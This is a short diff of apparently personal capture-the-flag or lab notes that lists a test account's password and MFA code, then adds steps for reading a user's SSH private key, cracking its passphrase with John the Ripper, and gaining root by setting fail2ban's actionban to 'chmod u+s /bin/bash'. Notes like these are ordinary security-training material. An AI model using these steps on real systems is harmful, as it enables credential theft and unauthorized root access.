@@ -49,3 +49,13 @@ user : jason_test_account
 pass : violet
 
 mfa code is 1029
+
+
+we can read the file /home/jason/.ssh/id_rsa
+we decode it with john
+
+1a2b3c4d         (jason.id_rsa)
+
+we can edit as sudo the /etc/fail2ban/action.d/iptables-multiport.conf\
+we set a actionban = chmod u+s /bin/bash\
+we can restart fail2ban service as sudo when we are fred
